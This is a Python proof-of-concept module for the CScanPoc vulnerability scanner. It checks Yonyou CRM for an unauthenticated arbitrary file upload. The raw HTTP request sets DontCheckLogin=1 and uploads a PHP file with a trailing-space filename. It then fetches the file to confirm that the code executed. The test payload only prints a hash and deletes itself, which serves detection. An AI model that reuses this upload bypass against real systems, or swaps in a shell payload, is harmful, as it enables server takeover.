# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random
import re

class Vuln(ABVuln):
    vuln_id = 'yonyou_0025' # 平台漏洞编号，留空
    name = '用友CRM系统 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = '2015-08-27'  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '用友CRM系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '3eecc23f-7c75-4124-84fb-e6cdcfb09558'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #__Refer___ = http://www.wooyun.org/bugs/wooyun-2015-0137238
            hh = hackhttp.hackhttp()
            shellName = ""
            for i in range(16):
                shellName += chr(ord('a') + random.randint(0,25))
            payload = "/ajax/swfupload.php?DontCheckLogin=1&vname=file"
            raw = """
POST /ajax/swfupload.php?DontCheckLogin=1&vname=file HTTP/1.1
Host: 111.207.244.5:8888
Content-Length: 312
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAVuAKsvesmnWtgEP
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: PHPSESSID=ibru7pqnplhi720caq0ev8uvt0

------WebKitFormBoundaryAVuAKsvesmnWtgEP
Content-Disposition: form-data; name="file"; filename="%s.php "
Content-Type: application/octet-stream

<?php echo md5(1);unlink(__FILE__);?>
------WebKitFormBoundaryAVuAKsvesmnWtgEP
Content-Disposition: form-data; name="upload"

upload
------WebKitFormBoundaryAVuAKsvesmnWtgEP--

""" % shellName
            code, head, res, err, _ = hh.http(self.target + payload, raw=raw)
            reRes = re.findall("(\w+.tmp.php)", res)
            if reRes:
                code, head, res, err, _ = hh.http(self.target + "tmpfile/" + reRes[0])
                if 'c4ca4238a0b923820dcc509a6f75849b' in res:
                    #security_hole(arg+payload+" ---> "+arg+"tmpfile/"+reRes[0]+" : file upload / get shell")
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                
        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
